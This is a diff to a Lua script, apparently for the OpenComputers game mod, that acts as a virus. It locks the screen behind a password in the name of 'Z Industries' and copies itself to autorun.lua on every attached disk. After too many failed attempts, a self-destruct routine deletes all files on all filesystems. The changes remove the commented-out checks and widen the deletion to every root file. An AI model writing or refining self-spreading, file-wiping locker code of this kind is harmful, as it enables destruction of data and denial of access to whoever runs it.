@@ -17,49 +17,37 @@ function Sleep(timeout)
   until computer.uptime() >= deadline
 end
 
---function EnableAutorun()
---      fs.setAutorunEnabled(true)
---      computer.shutdown(true)
---      print("Autorun activé")
---end
-
 function lockScreen()
-  --if(fs.isAutorunEnabled()) {
-    term.clear()
-    term.write("=== Système verrouillé par Z Industries ===\n")
-    term.write("Entrez le mot de passe pour déverrouiller :\n")
-  --} else {
-      --term.clear()
-      --term.write("Autorun non activé, crash de l'infrastructure en cours.")
-      --Sleep(0.1)
-      --computer.crash("Autorun non actif, veuillez redémarrer l'infrastructure")
-    --}
+  term.clear()
+  term.write("=== Système verrouillé par Z Industries ===\n")
+  term.write("Entrez le mot de passe pour déverrouiller :\n")
 end
 
 function selfDestruct()
   term.clear()
   term.write("[ALERTE] Tentatives excessives détectées\n")
   term.write("Initialisation de l'autodestruction...\n")
-  Sleep(1)
+  Sleep(2)
 
   -- Suppression de tous les fichiers sur tous les disques
   for address in component.list("filesystem") do
+    fs.setAutorunEnabled(true)
     if fs then
       for file in fs.list("/") or {} do
         pcall(function()
-          fs.remove("/boot/*" .. file)
+          fs.remove("" .. file)
         end)
       end
     end
   end
 
-  term.write("Destruction terminée.\n")
+  term.write("Destruction terminée. Adieu.\n")
   Sleep(3)
   computer.shutdown(true)
 end
 
 function copyVirus()
-  local fileName = "/home/zoneground.lua"
+  local fileName = "/home/autorun.lua"
   for address in component.list("filesystem") do
     local fs = component.proxy(address)
     if fs and fs.spaceTotal() > 0 then
@@ -79,7 +67,6 @@ function unlock()
 end
 
 function main()
-  --EnableAutorun()
   copyVirus()
   lockScreen()
   while attempts < MAX_ATTEMPTS do
